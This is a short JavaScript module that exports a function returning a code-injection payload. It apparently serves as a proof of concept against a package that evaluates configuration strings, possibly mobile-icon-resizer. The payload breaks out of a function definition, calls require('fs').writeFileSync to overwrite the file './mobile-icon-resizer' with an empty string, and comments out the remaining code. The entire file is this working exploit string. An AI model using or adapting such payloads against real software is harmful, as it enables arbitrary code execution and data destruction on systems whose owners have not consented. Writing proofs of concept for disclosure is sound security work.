function getPayload() {
    return `
        function (){});require(`fs`).writeFileSync(`./mobile-icon-resizer`, ``); //(){console.log(123)}
    `;
}

module.exports = { getPayload };